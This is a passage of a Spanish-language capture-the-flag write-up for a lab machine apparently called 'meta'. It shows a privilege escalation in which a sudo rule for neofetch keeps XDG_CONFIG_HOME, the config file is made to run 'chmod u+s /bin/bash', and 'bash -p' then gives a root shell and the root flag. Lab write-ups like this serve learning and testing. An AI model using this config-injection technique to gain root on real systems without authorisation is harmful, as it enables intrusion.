Si nos figamos bien cuando hicimos sudo -l tenemos lo siguiente:
``` 
thomas@meta:~/.config/neofetch$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```
Ese env_keep=XDG_CONFIG_HOME indica algo, el env_keep permite mantener las variables de entorno del usuario, si actualizamos la variable XDG_CONFIG_HOME a la ruta donde tengo mi config del neofetch igual funciona.
```
thomas@meta:~/.config/neofetch$ export XDG_CONFIG_HOME=/home/thomas/.config/neofetch/
thomas@meta:~/.config/neofetch$ echo $XDG_CONFIG_HOME
/home/thomas/.config/
```
El config.conf se resetea así que posiblemente se haya borrado la línea que escribiste, tendrás que volver a escribirla; `chmod u+s /bin/bash`.
```
thomas@meta:~/.config/neofetch$ sudo neofetch
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 15 hours, 10 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 147MiB / 1994MiB 
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""

thomas@meta:~/.config/neofetch$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```
¡¡¡Y nos dio el SUID!!
```
thomas@meta:~/.config/neofetch$ bash -p
bash-5.0# id
uid=1000(thomas) gid=1000(thomas) euid=0(root) groups=1000(thomas)
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
7e6e421afbde39df1be2c******
```
Ha estado chula la máquina, he aprendido cosas y disfrutado haciéndola.





